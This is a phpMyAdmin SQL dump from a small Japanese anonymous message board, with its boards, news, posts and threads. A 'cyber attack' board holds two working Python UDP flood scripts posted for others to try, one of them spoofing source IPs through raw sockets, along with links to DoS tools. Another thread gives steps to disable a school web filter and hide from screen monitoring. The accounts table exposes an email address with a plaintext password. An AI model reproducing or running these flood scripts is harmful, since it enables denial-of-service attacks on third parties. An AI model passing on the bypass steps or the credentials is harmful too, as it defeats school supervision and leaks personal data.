-- phpMyAdmin SQL Dump
-- version 4.4.15.10
-- https://www.phpmyadmin.net
--
-- Host: mysql1.php.starfree.ne.jp
-- Generation Time: 2025 年 4 月 27 日 10:09
-- サーバのバージョン： 5.7.27
-- PHP Version: 5.4.16

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `naisuweb_date`
--

-- --------------------------------------------------------

--
-- テーブルの構造 `boards`
--

CREATE TABLE IF NOT EXISTS `boards` (
  `id` int(11) NOT NULL,
  `slug` varchar(50) NOT NULL,
  `name` varchar(100) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB AUTO_INCREMENT=158 DEFAULT CHARSET=utf8;

--
-- テーブルのデータのダンプ `boards`
--

INSERT INTO `boards` (`id`, `slug`, `name`, `created_at`) VALUES
(1, 's', '0chan初心者板', '2024-12-09 11:49:45'),
(2, 'g', 'VIP板', '2024-12-09 11:49:45'),
(3, 'a', 'サイバー攻撃板', '2024-12-09 11:49:45'),
(136, 'zi', '学校のパソコンの裏技', '2024-12-10 10:32:37'),
(137, 'n', 'なんでも質問板', '2024-12-10 10:32:37'),
(138, 'z', '自己紹介板', '2024-12-10 10:32:37'),
(139, 'l', 'ゲーム板', '2024-12-10 10:32:37'),
(140, 'v', 'プログラミング板', '2024-12-10 10:32:37'),
(141, 'q', 'AI系板', '2024-12-10 10:32:37'),
(142, 'p', '政治ニュース板', '2024-12-10 10:32:37'),
(143, 'o', 'snsニュース板', '2024-12-10 10:32:37'),
(144, 'i', 'ITニュース板', '2024-12-10 10:32:37'),
(145, 'r', 'なんでもニュース板', '2024-12-10 10:32:37'),
(146, 'b', 'スポーツ板', '2024-12-10 10:32:37'),
(147, 'd', '削除議論&依頼板', '2024-12-10 10:32:37'),
(148, 'a1', 'AA板', '2024-12-10 10:32:37'),
(149, 'm3', '自己紹介板', '2024-12-10 10:32:37'),
(150, 'h', 'ホラー板', '2024-12-10 10:32:37'),
(151, 'k', '機械・電子系板', '2024-12-10 10:32:37'),
(152, 'si', '心理学板', '2024-12-10 10:32:37'),
(153, 'ga', 'ガジェット板', '2024-12-10 10:32:37'),
(154, 'm4', '飯テロ板', '2024-12-10 10:32:37'),
(155, 'i2', 'イラスト板', '2024-12-10 10:32:37'),
(156, 'y', '旅行板', '2024-12-10 10:32:37'),
(157, 'p2', 'ペット板', '2024-12-10 10:32:37');

-- --------------------------------------------------------

--
-- テーブルの構造 `id`
--

CREATE TABLE IF NOT EXISTS `id` (
  `id` int(11) NOT NULL,
  `email` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

--
-- テーブルのデータのダンプ `id`
--

INSERT INTO `id` (`id`, `email`, `password`) VALUES
(1, 'sabuaka45738@gmail.com', '1'),
(2, 'あ', 'a');

-- --------------------------------------------------------

--
-- テーブルの構造 `news`
--

CREATE TABLE IF NOT EXISTS `news` (
  `id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `image` varchar(255) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;

--
-- テーブルのデータのダンプ `news`
--

INSERT INTO `news` (`id`, `title`, `content`, `created_at`, `image`) VALUES
(2, 'tesuto', 'tesuto', '2024-12-11 10:21:38', NULL),
(3, 'vip板を作成', 'vip板を作成しました。\r\nhttp://naisuweb.starfree.jp/board.php?board_slug=g', '2024-12-11 10:27:21', NULL),
(4, '画像アップロード機能', 'ニュースページに画像アップロード機能を追加しました。', '2024-12-11 10:44:52', 'uploads/image_67596d249da057.13638162.png'),
(5, '画像アップロード機能', 'ニュースページに画像アップロード機能を追加しました。', '2024-12-11 11:48:34', 'uploads/image_67597c12966600.47312047.png'),
(6, '機能アップ', '>>1\r\nで移動ができるようにしまいした。', '2024-12-12 11:04:14', NULL),
(7, 'バージョンアップ', 'レスにid機能をつけました。一週間ごとにidが変わります。', '2024-12-18 10:53:23', NULL),
(8, '新しい板を作成', '学校のパソコンの裏技板を作成しました。\r\nhttp://naisuweb.starfree.jp/board.php?board_slug=zi', '2024-12-18 11:04:30', NULL),
(9, '新しいスレッド', 'りらっくまさんが\r\n新しいスレッド「ざつだん」を作成しました。\r\nhttp://naisuweb.starfree.jp/thread.php?thread_id=70', '2024-12-20 10:11:02', NULL),
(10, 'サーバー移行', 'サーバーを移行しました。\r\nhttp://zerochan.stars.ne.jp/\r\n※今までのスレッド、レスは残ってあります。', '2024-12-21 06:11:55', NULL),
(11, 'サーバー変更', 'サーバーを元に戻しました。\r\nhttp://zerochan.stars.ne.jp/\r\nにはアクセスできません。\r\n今のurlのままで大丈夫です。今までと変わりません。', '2025-01-29 07:01:26', NULL);

-- --------------------------------------------------------

--
-- テーブルの構造 `responses`
--

CREATE TABLE IF NOT EXISTS `responses` (
  `id` int(11) NOT NULL,
  `thread_id` int(11) NOT NULL,
  `content` text NOT NULL,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  `name` varchar(100) NOT NULL DEFAULT 'specter',
  `image_path` varchar(255) DEFAULT NULL,
  `user_id` varchar(255) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=151 DEFAULT CHARSET=utf8;

--
-- テーブルのデータのダンプ `responses`
--

INSERT INTO `responses` (`id`, `thread_id`, `content`, `created_at`, `name`, `image_path`, `user_id`) VALUES
(1, 60, 'テスト', '2024-12-10 17:09:36', 'specter', NULL, ''),
(2, 60, 'あ', '2024-12-10 17:09:40', 'specter', NULL, ''),
(3, 60, 'a', '2024-12-10 17:09:42', 'specter', NULL, ''),
(4, 60, 'テスト', '2024-12-10 17:13:43', 'specter', NULL, ''),
(5, 60, 'テスト', '2024-12-10 17:15:44', 'specter', NULL, ''),
(6, 60, 'あ', '2024-12-10 17:16:18', 'specter', NULL, ''),
(7, 60, 'こんにちは', '2024-12-10 17:18:01', 'specter', NULL, ''),
(8, 60, 'hello', '2024-12-10 17:18:07', 'specter', NULL, ''),
(10, 60, 'あ', '2024-12-10 17:23:24', 'specter', NULL, ''),
(11, 60, 'あ', '2024-12-10 17:23:27', 'specter', NULL, ''),
(12, 60, 'あ', '2024-12-10 17:27:30', 'specter', NULL, ''),
(13, 60, 'なに？', '2024-12-10 17:40:51', 'specter', NULL, ''),
(14, 60, 'あ', '2024-12-10 17:42:37', 'specter', NULL, ''),
(15, 60, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', '2024-12-10 17:44:03', 'specter', NULL, ''),
(16, 60, 'a', '2024-12-10 17:44:33', 'specter', NULL, ''),
(17, 60, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', '2024-12-10 17:44:38', 'specter', NULL, ''),
(18, 60, 'こんにちは!', '2024-12-10 17:57:26', 'specter', NULL, ''),
(19, 60, 'あ？', '2024-12-10 17:57:33', 'specter', NULL, ''),
(20, 60, 'ひいいー\r\n', '2024-12-10 17:57:38', 'specter', NULL, ''),
(21, 60, '\r\n\r\n\r\n', '2024-12-10 17:57:42', 'specter', NULL, ''),
(22, 60, 'おたすけおおお', '2024-12-10 17:57:47', 'specter', NULL, ''),
(23, 60, '何ビビってんの？', '2024-12-10 17:57:57', 'specter', NULL, ''),
(24, 61, 'あ', '2024-12-10 18:29:36', 'specter', NULL, ''),
(25, 61, 'テスト', '2024-12-10 18:59:26', 'specter', NULL, ''),
(28, 61, 'だいすけはスポーツじゃねぇw', '2024-12-10 19:19:13', 'specter', NULL, ''),
(29, 61, 'そういえば名前変えて0chan初心者板にした', '2024-12-10 19:35:10', 'specter', NULL, ''),
(30, 62, '名前を入力しなかったら、specterになる', '2024-12-10 19:39:08', 'specter', NULL, ''),
(31, 62, 'idはないから、完全に匿名。なりすましもできる。', '2024-12-10 19:39:30', 'specter', NULL, ''),
(32, 62, 'もし削除したかったら、削除依頼板に行く', '2024-12-10 19:39:49', 'specter', NULL, ''),
(33, 62, '板を増やしたかったら言って', '2024-12-10 19:40:13', 'specter', NULL, ''),
(34, 62, '4chanを参考にして作った', '2024-12-10 19:41:09', 'specter', NULL, ''),
(35, 63, '画像テスト', '2024-12-10 19:49:55', '', 'upload/67581cd34b37b_l_ikko_daisuke001.jpg', ''),
(36, 62, '一応これ画像アップできる', '2024-12-10 20:11:59', '', 'upload/675821ff32363_l_ikko_daisuke001.jpg', ''),
(37, 64, '　　　 ∧∧　　／￣￣￣￣￣\r\n　　　(,,ﾟДﾟ)＜　ゴルァ！\r\n　　 ⊂　　⊃　＼＿＿＿＿＿\r\n　　～|　　|\r\n　,,　  し`J', '2024-12-10 20:39:37', '', NULL, ''),
(38, 64, '\r\n■　　　　　　　　　　　　　　■　　　■　　　　　　　　　　\r\n■　　　　　　　　　　　　　　■　　　■　　　　　　　　　　\r\n■　　　　　　　　　　　　　　■　　　■　　　　　　　　　　\r\n■　■■■　　　　■■■■　　■　　　■　　　　■■■■　　\r\n■■　　■■　　■■　　■　　■　　　■　　　■■　　■■　\r\n■　　　　■　　■　　　■■　■　　　■　　　■　　　　■　\r\n■　　　　■　　■■■■■■　■　　　■　　　■　　　　■　\r\n■　　　　■　　■　　　　　　■　　　■　　　■　　　　■　\r\n■　　　　■　　■■　　　　　■　　　■　　　■■　　■■　\r\n■　　　　■　　　■■■■　　■　　　■　　　　■■■■　', '2024-12-10 20:40:55', '', NULL, ''),
(39, 64, 'ずれてる', '2024-12-10 20:41:05', '', NULL, ''),
(40, 62, 'だいすけは草w', '2024-12-10 21:30:10', '', NULL, ''),
(41, 63, 'テスト', '2024-12-11 16:17:14', '', NULL, ''),
(42, 65, 'https://w.atwiki.jp/kazehotaru/pages/42.html', '2024-12-11 19:46:52', '', NULL, ''),
(43, 65, 'yahooに飛ぶのなんなん?', '2024-12-11 19:54:54', '', NULL, ''),
(44, 65, 'geocitiesがサ終したから全部消えとる', '2024-12-11 19:55:06', '', NULL, ''),
(45, 65, '使えそうな田代砲\r\nhttps://komainu.kakurezato.com/boon.html\r\nhttps://rifurekusyon.github.io/tornado.github.io/Tashiro_kai.html\r\nhttps://tashiro.adotann.me/', '2024-12-11 19:55:26', '', NULL, ''),
(46, 65, 'せんきゅー', '2024-12-11 19:55:32', '', NULL, ''),
(47, 65, 'これいいかも\r\nhttps://rifurekusyon.github.io/tornado.github.io/pc.html', '2024-12-11 20:04:19', '', NULL, ''),
(48, 65, '自作スクリプト作ってみた↓\r\npython\r\n\r\n\r\nimport socket\r\nimport random\r\nimport time\r\n\r\ndef get_target_info():\r\n    # IPアドレスかURLを入力\r\n    ip_or_url = input("ターゲットのIPアドレスを使いますか？ (y/n): ").lower()\r\n    if ip_or_url == ''y'':\r\n        target_ip = input("ターゲットIPアドレスを入力してください: ")\r\n    elif ip_or_url == ''n'':\r\n        target_url = input("ターゲットURLを入力してください: ")\r\n        # URLからIPアドレスを取得\r\n        target_ip = socket.gethostbyname(target_url)\r\n    else:\r\n        print("無効な入力です。終了します。")\r\n        return None, None\r\n    \r\n    # ポート番号の入力\r\n    target_port = int(input("ターゲットポートを入力してください: "))\r\n    \r\n    return target_ip, target_port\r\n\r\ndef send_udp_packets(target_ip, target_port):\r\n    # ソケットの作成\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\r\n    \r\n    # 送信するデータ（パケット）を設定\r\n    message = b"UDP Flood Attack"\r\n    \r\n    print(f"UDPパケットを {target_ip}:{target_port} に送信しています...")\r\n    \r\n    try:\r\n        while True:\r\n            # ランダムなIPアドレスを生成して送信\r\n            spoofed_ip = ''.''.join([str(random.randint(0, 255)) for _ in range(4)])\r\n            sock.sendto(message, (target_ip, target_port))\r\n            print(f"パケット送信中... 偽装IP: {spoofed_ip}")\r\n            time.sleep(0.1)  # 送信間隔を少し空ける\r\n    except KeyboardInterrupt:\r\n        print("攻撃が終了しました。")\r\n\r\nif __name__ == "__main__":\r\n    # ターゲット情報を取得\r\n    target_ip, target_port = get_target_info()\r\n    \r\n    if target_ip and target_port:\r\n        send_udp_packets(target_ip, target_port)\r\n', '2024-12-12 17:27:55', '', NULL, ''),
(49, 65, '試してみて', '2024-12-12 17:28:16', '', NULL, ''),
(50, 66, 'import socket\r\nimport struct\r\n\r\ndef create_ip_header(src_ip, dst_ip):\r\n    # IPヘッダーを構築\r\n    version = 4\r\n    ihl = 5  # ヘッダー長\r\n    tos = 0  # サービスの種類\r\n    tot_len = 20 + 8  # IPヘッダー + UDP\r\n    packet_id = 54321\r\n    frag_off = 0\r\n    ttl = 64\r\n    protocol = socket.IPPROTO_UDP\r\n    checksum = 0  # チェックサム（計算は省略）\r\n    src_addr = socket.inet_aton(src_ip)\r\n    dst_addr = socket.inet_aton(dst_ip)\r\n    ihl_version = (version << 4) + ihl\r\n\r\n    return struct.pack(''!BBHHHBBH4s4s'', ihl_version, tos, tot_len, packet_id, frag_off, ttl, protocol, checksum, src_addr, dst_addr)\r\n\r\ndef create_udp_header(src_port, dst_port, length, checksum):\r\n    return struct.pack(''!HHHH'', src_port, dst_port, length, checksum)\r\n\r\ndef send_spoofed_packet(src_ip, dst_ip, dst_port):\r\n    try:\r\n        # RAWソケットの作成\r\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\r\n\r\n        # 偽装IPアドレスを含むIPヘッダーの作成\r\n        ip_header = create_ip_header(src_ip, dst_ip)\r\n\r\n        # UDPヘッダーの作成\r\n        src_port = 12345  # ランダムな送信元ポート\r\n        udp_length = 8 + len(b"UDP Flood Attack")\r\n        udp_header = create_udp_header(src_port, dst_port, udp_length, 0)\r\n\r\n        # パケット全体を構築\r\n        message = b"UDP Flood Attack"\r\n        packet = ip_header + udp_header + message\r\n\r\n        # パケット送信\r\n        sock.sendto(packet, (dst_ip, 0))\r\n        print(f"パケット送信: 偽装IP: {src_ip} -> {dst_ip}:{dst_port}")\r\n    except Exception as e:\r\n        print(f"エラー: {e}")\r\n\r\ndef get_target_info():\r\n    # IPアドレスかURLを入力\r\n    ip_or_url = input("ターゲットのIPアドレスを使いますか？ (y/n): ").lower()\r\n    if ip_or_url == ''y'':\r\n        target_ip = input("ターゲットIPアドレスを入力してください: ")\r\n    elif ip_or_url == ''n'':\r\n        target_url = input("ターゲットURLを入力してください: ")\r\n        try:\r\n            target_ip = socket.gethostbyname(target_url)\r\n        except socket.gaierror:\r\n            print(f"エラー: ''{target_url}'' の名前解決に失敗しました。正しいURLを入力してください。")\r\n            return None, None\r\n    else:\r\n        print("無効な入力です。終了します。")\r\n        return None, None\r\n\r\n    # ポート番号の入力\r\n    try:\r\n        target_port = int(input("ターゲットポートを入力してください: "))\r\n    except ValueError:\r\n        print("無効なポート番号です。終了します。")\r\n        return None, None\r\n\r\n    return target_ip, target_port\r\n\r\nif __name__ == "__main__":\r\n    # ターゲット情報を取得\r\n    target_ip, target_port = get_target_info()\r\n    if target_ip and target_port:\r\n        print(f"ターゲットIP: {target_ip}, ポート: {target_port}")\r\n        try:\r\n            while True:\r\n                # ランダムな偽装IPアドレスを生成\r\n                spoofed_ip = ''.''.join([str(random.randint(1, 255)) for _ in range(4)])\r\n                send_spoofed_packet(spoofed_ip, target_ip, target_port)\r\n        except KeyboardInterrupt:\r\n            print("攻撃を終了しました。")\r\n', '2024-12-12 17:50:32', '', NULL, ''),
(51, 65, '改善版をhttp://naisuweb.starfree.jp/thread.php?thread_id=66で', '2024-12-12 18:11:59', '', NULL, ''),
(52, 66, '管理者権限じゃないとできない', '2024-12-12 18:12:23', '', NULL, ''),
(53, 66, 'exe化したやつをgithubで公開した', '2024-12-12 18:19:50', '', NULL, ''),
(57, 66, 'はや', '2024-12-12 19:18:37', '', NULL, ''),
(58, 66, 'web版をgithubで公開するから、ちょいまち', '2024-12-12 19:19:04', '', NULL, ''),
(59, 66, 'pythonのやつのexe化したやつのgithub↓\r\nhttps://github.com/dostesuto/cmdos/tree/dos', '2024-12-12 19:35:11', '', NULL, ''),
(60, 66, 'web版作った\r\nめっちゃ重いから、ブラウザ落ちるかも\r\nhttps://dostesuto.github.io/dostornado/', '2024-12-12 19:48:55', '', NULL, ''),
(61, 66, '>>8\r\n見た目かっこよ', '2024-12-12 19:59:24', '', NULL, ''),
(62, 63, '>>1', '2024-12-12 20:02:01', '', NULL, ''),
(63, 63, '>>2', '2024-12-12 20:02:07', '', NULL, ''),
(64, 63, 'a', '2024-12-12 20:02:13', '', NULL, ''),
(65, 63, 'a', '2024-12-12 20:02:14', '', NULL, ''),
(66, 63, 'a', '2024-12-12 20:02:16', '', NULL, ''),
(67, 63, 'a', '2024-12-12 20:02:18', '', NULL, ''),
(68, 63, 'a', '2024-12-12 20:02:19', '', NULL, ''),
(69, 63, '>>9', '2024-12-12 20:02:28', '', NULL, ''),
(70, 63, 'a\r\na\r\na\r\na\r\na\r\na\r\na\r\na\r\na\r\na\r\na\r\na\r\na\r\na\r\na\r\na\r\na\r\na\r\na\r\na', '2024-12-12 20:02:40', '', NULL, ''),
(71, 63, '>1\r\n', '2024-12-12 20:02:45', '', NULL, ''),
(72, 63, '>>1', '2024-12-12 20:02:50', '', NULL, ''),
(73, 63, '>>1で移動できるようにした', '2024-12-12 20:03:05', '', NULL, ''),
(74, 66, '>>4\r\n一応削除しとくわ', '2024-12-12 20:42:01', '', NULL, ''),
(75, 66, '>>7\r\nソースコード↓\r\nhttps://github.com/dostesuto/dostornado', '2024-12-12 20:53:15', '', NULL, ''),
(76, 61, 'あ', '2024-12-14 12:26:46', '', NULL, ''),
(77, 66, 'すご', '2024-12-14 23:07:29', '', NULL, ''),
(78, 67, 'スレ主だったら、赤い文字でスレ主って表示されるはず', '2024-12-15 12:28:09', '', NULL, ''),
(79, 67, 'スレ主じゃない人', '2024-12-15 12:28:34', '', NULL, ''),
(80, 67, 'テスト', '2024-12-15 12:33:42', '', NULL, ''),
(81, 67, 'テスト', '2024-12-15 12:35:44', '', NULL, ''),
(82, 67, 'tesuto\r\n', '2024-12-15 12:36:30', '', NULL, ''),
(83, 67, 'テスト', '2024-12-15 12:38:37', '', NULL, ''),
(84, 65, '自作\r\nhttps://dostesuto.github.io/dostornado/', '2024-12-15 14:32:37', '', NULL, ''),
(85, 62, 'ReloadやCatalogをクリックすると「404 File Not Found」になりますね', '2024-12-15 18:21:56', '', NULL, ''),
(86, 60, 'a', '2024-12-17 18:59:35', '', NULL, ''),
(87, 62, ' specter', '2024-12-17 19:00:59', '', NULL, ''),
(88, 60, 'すごい!', '2024-12-18 14:17:38', '', NULL, ''),
(89, 63, 'スレッドが立てられん', '2024-12-18 16:45:48', '', NULL, ''),
(90, 68, 'フィルタ解除方法', '2024-12-18 19:26:34', 'd7c976', NULL, ''),
(91, 68, '1,拡張機能管理画面に行く\r\n2,ロイロwebフィルタのビューを検証の隣の青いところをクリック\r\n3,新しいwindowが出るから、そこにwhile(true){}と打つ。\r\n4,最小化して完了', '2024-12-18 19:29:00', '', NULL, ''),
(92, 68, 'これ学校で使うと先生に画面監視でばれる\r\n', '2024-12-18 19:31:35', '', NULL, ''),
(93, 68, 'interclass loud 学習者 拡張機能を同じようにやればok', '2024-12-18 19:40:29', 'Specter', NULL, 'd7c976'),
(94, 68, '先生から見ると、電源OFと出るから、画面監視されない', '2024-12-18 19:46:12', 'Specter', NULL, 'd7c976'),
(95, 68, 'どうやってわかったん？', '2024-12-18 19:46:34', 'Specter', NULL, 'a5d99c'),
(96, 68, '友達が画面監視のやつinterなんちゃらって書いてあったって言ってたから', '2024-12-18 19:47:23', 'Specter', NULL, 'd7c976'),
(97, 68, '試してみて、こっそり見てもらったらできたって感じ', '2024-12-18 19:47:48', 'Specter', NULL, 'd7c976'),
(98, 68, 'パシリw', '2024-12-18 19:48:24', 'Specter', NULL, 'a5d99c'),
(99, 68, 'いやこれは自分から逝ってたからパシリじゃない', '2024-12-18 19:48:45', 'Specter', NULL, 'd7c976'),
(100, 68, '間違えた　行ってたから', '2024-12-18 19:49:04', 'Specter', NULL, 'd7c976'),
(101, 68, '逝ってたw', '2024-12-18 19:49:52', 'Specter', NULL, 'a5d99c'),
(102, 63, '修正した', '2024-12-18 19:56:26', 'Specter', NULL, 'a5d99c'),
(103, 63, 'idつけた', '2024-12-18 19:56:33', 'Specter', NULL, 'a5d99c'),
(104, 68, '>>2\r\n付け足し\r\nデベロッパーモードをonにしてから', '2024-12-18 19:57:29', 'Specter', NULL, 'd7c976'),
(105, 68, 'デベロッパーモードが制限されない限りこれずっとできる', '2024-12-18 19:59:41', 'Specter', NULL, 'd7c976'),
(106, 69, 'qq', '2024-12-19 15:17:47', '933370', NULL, ''),
(107, 69, 'q', '2024-12-19 15:17:52', 'q', NULL, '933370'),
(108, 70, 'ざつだん', '2024-12-19 15:19:39', '933370', 'upload/6763bafbd36ce_images.jpeg', ''),
(109, 70, 'こんにちわ\r\n', '2024-12-19 15:44:33', 'Specter', NULL, '933370'),
(110, 70, 'だれかきて\r\n', '2024-12-19 15:45:27', 'りらっくま', NULL, '933370'),
(111, 71, '\r\n\r\n\r\n\r\n\r\n\r\n', '2024-12-20 15:15:36', 'd91775', NULL, ''),
(112, 72, '\r\n\r\n\r\n\r\n\r\n\r\n', '2024-12-20 15:15:36', '10494d', NULL, ''),
(113, 73, '\r\n\r\n\r\n\r\n\r\n\r\n', '2024-12-20 15:16:45', 'fd82e9', NULL, ''),
(114, 70, 'どっからこの掲示板知った？', '2024-12-20 19:08:46', 'Specter', NULL, 'b99317'),
(115, 67, 'idつけた\r\n', '2024-12-21 08:34:40', 'Specter', NULL, 'b99317'),
(116, 67, '機能実装前に入力していた人は反映されていない', '2024-12-21 08:35:05', 'Specter', NULL, 'b99317'),
(117, 67, '一週間ごとにidが変わる', '2024-12-21 08:35:14', 'Specter', NULL, 'b99317'),
(118, 73, '？', '2024-12-21 15:31:15', 'Specter', NULL, 'a5d99c'),
(119, 70, 'すげー', '2024-12-21 17:04:41', 'Specter', NULL, '545f66'),
(120, 74, '\r\n\r\n\r\n\r\n\r\n\r\n', '2024-12-23 09:03:09', '270765', NULL, ''),
(121, 75, '\r\n\r\n\r\n\r\n\r\n\r\n', '2024-12-23 09:04:26', '095f0d', NULL, ''),
(122, 75, '？\r\n', '2024-12-23 19:22:55', 'Specter', NULL, 'b99317'),
(123, 64, 'すげー', '2024-12-26 15:21:06', 'Anonymous', NULL, 'f5fce4'),
(124, 75, 'why?', '2024-12-26 15:21:46', 'Anonymous', NULL, 'f5fce4'),
(125, 75, 'what?', '2024-12-30 10:20:38', 'Specter', NULL, '0ea713'),
(126, 73, 'whay?\r\n', '2024-12-30 10:21:05', 'Specter', NULL, '0ea713'),
(127, 70, 'noteで知った', '2025-01-10 11:55:34', 'Specter', NULL, 'aa1f30'),
(128, 70, 'へー', '2025-01-29 15:56:12', 'Specter', NULL, '1b9f28'),
(129, 63, 'テスト', '2025-01-29 20:05:58', 'Specter', NULL, 'c84b3b'),
(130, 63, 'テスト123456', '2025-01-29 20:06:10', 'Specter', NULL, 'c84b3b'),
(131, 76, 'poolskechみたいなサイト作ってみた', '2025-01-29 20:06:43', 'c84b3b', NULL, ''),
(132, 76, '本家↓\r\nhttps://plsk.net\r\n', '2025-01-29 20:07:05', 'Specter', NULL, 'c84b3b'),
(133, 76, '自分はphpとdbとしてjsonを使った', '2025-01-29 20:07:24', 'Specter', NULL, 'c84b3b'),
(134, 76, 'json？', '2025-01-29 20:07:39', 'Specter', NULL, '630143'),
(135, 76, 'mysqlじゃないんだ', '2025-01-29 20:07:51', 'Specter', NULL, '630143'),
(136, 76, '試してみた。普通に行けた', '2025-01-29 20:08:27', 'Specter', NULL, 'c84b3b'),
(137, 76, 'けど、文字数が多くなると重くなってくるかも', '2025-01-29 20:08:44', 'Specter', NULL, 'c84b3b'),
(138, 76, '本家poolskechみたいにhttps://plsk.net/好きな文字列でアクセスできる。\r\n', '2025-01-29 20:09:33', 'Specter', NULL, 'c84b3b'),
(139, 76, 'url\r\nhttps://stratos.stars.ne.jp/memo/', '2025-01-29 20:10:47', 'Specter', NULL, 'c84b3b'),
(140, 76, 'https://stratos.stars.ne.jp/memo/1234\r\nとかでアクセスできる、/1234　ここの部分は4文字以上、40文字以下の半角英数字でできる。', '2025-01-29 20:11:39', 'Specter', NULL, 'c84b3b'),
(141, 76, 'phpって?=とかじゃなかったっけ？', '2025-01-30 18:26:22', 'Specter', NULL, '1b9f28'),
(142, 76, '.htaccessでパーマリンク設定してるから', '2025-01-30 18:27:25', 'Specter', NULL, '8b5bcc'),
(143, 67, 'Mac\r\n\r\nkara akusesu site imasu\r\n\r\nro-mazi de sika dekinn', '2025-01-31 16:13:51', 'Specter', NULL, '015062'),
(144, 74, 'ininesd samc', '2025-02-13 19:22:16', 'Iinonn', NULL, '6371ff'),
(145, 77, 'iitoomouyo', '2025-02-13 19:22:54', '6371ff', NULL, ''),
(146, 70, '初心者?', '2025-03-29 01:47:32', 'asa101', NULL, 'ede2e1'),
(147, 62, '使い方ありがたい。', '2025-03-29 01:48:47', 'asa101', NULL, 'ede2e1'),
(148, 69, 'Qqqqq', '2025-03-29 01:49:19', 'asa101', NULL, 'ede2e1'),
(149, 63, '>>18ふむ。', '2025-03-29 01:50:55', 'A', NULL, 'ede2e1'),
(150, 64, '| ∧＿∧\r\n|(*>ω< )\r\n| o ? o\r\n| u―ｕ\r\n￣￣￣￣￣\r\n', '2025-03-29 01:51:48', 'asa101', NULL, 'ede2e1');

-- --------------------------------------------------------

--
-- テーブルの構造 `threads`
--

CREATE TABLE IF NOT EXISTS `threads` (
  `id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `password` varchar(255) DEFAULT NULL,
  `board_slug` varchar(50) NOT NULL,
  `content` text NOT NULL,
  `image` varchar(255) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=78 DEFAULT CHARSET=utf8;

--
-- テーブルのデータのダンプ `threads`
--

INSERT INTO `threads` (`id`, `title`, `created_at`, `password`, `board_slug`, `content`, `image`) VALUES
(3, '.onion版', '2024-11-22 10:16:24', '$2y$10$CrtMWpZkiHhyMERWgWTWGOVeViHZnFssWhOPPeh22d65yAYwbXqYa', '', '', NULL),
(40, 'テストです', '2024-11-24 00:15:21', '$2y$10$OwJqYEoqaaUyhUOVdbEIa.0PtbCB5hZ.nO7r3SAuGBAdc01zdkfYa', '', '', NULL),
(41, 'phpでX(旧Twitter)もどき作った', '2024-11-24 06:09:00', '$2y$10$qyVfDQ9CIu7kdte0wtkVEers9o4Cng2w/Nm3cMEZle9ebh.TQr2ly', '', '', NULL),
(43, 'url', '2024-11-27 06:44:26', NULL, '', '', NULL),
(44, 'ふぁいるなう', '2024-11-29 08:56:59', NULL, '', '', NULL),
(45, 'You are an idiot', '2024-11-29 09:13:51', NULL, '', '', NULL),
(46, '撮影用', '2024-11-29 22:54:52', NULL, '', '', NULL),
(47, '動画無料', '2024-11-30 06:04:20', NULL, '', '', NULL),
(49, '画面共有', '2024-12-01 02:27:02', NULL, '', '', NULL),
(50, 'じーふぉーすなう', '2024-12-01 06:55:34', NULL, '', '', NULL),
(51, 'マイクラサーバー', '2024-12-01 08:18:06', NULL, '', '', NULL),
(52, 'url', '2024-12-02 11:51:11', '$2y$10$Bfn08tPCxSBITJWSgFbvrOYqykN9oh.h8H3sasTCsDjsAyUkIHamy', '', '', NULL),
(53, 'テイコウペンギン 動画', '2024-12-02 11:53:51', NULL, '', '', NULL),
(54, 'メアド', '2024-12-03 08:11:30', '$2y$10$vrpWzwaXDvU2mYo3nWwiF.gHEEyZ48oZjzjraD3mZZH0MZwP3wTDe', '', '', NULL),
(55, 'chatgptプロンプト', '2024-12-04 06:19:53', NULL, '', '', NULL),
(56, 'youtube', '2024-12-07 01:46:31', NULL, '', '', NULL),
(57, 'kakeruメモ', '2024-12-07 01:58:03', '$2y$10$/6rYwu3rrZIfLTWFdJArUemAchqAjap1oHE6BAzRO2vPdIpgd2i0a', '', '', NULL),
(58, 'ファイル場所', '2024-12-08 01:54:46', NULL, '', '', NULL),
(59, 'ようつべ', '2024-12-08 04:38:01', NULL, '', '', NULL),
(60, 'テスト', '2024-12-10 08:04:38', NULL, 's', '', NULL),
(61, 'てすと', '2024-12-10 09:29:31', NULL, 's', 'あ', NULL),
(62, '0chanの使い方', '2024-12-10 10:38:34', NULL, 's', '0chanの使い方', NULL),
(63, 'テスト', '2024-12-10 10:45:42', NULL, 'zi', 'テスト', NULL),
(64, 'AAテスト', '2024-12-10 11:39:18', NULL, 'a1', 'AAテスト', NULL),
(65, '田代砲一覧', '2024-12-11 10:46:45', NULL, 'a', '田代砲のリンク一覧です', NULL),
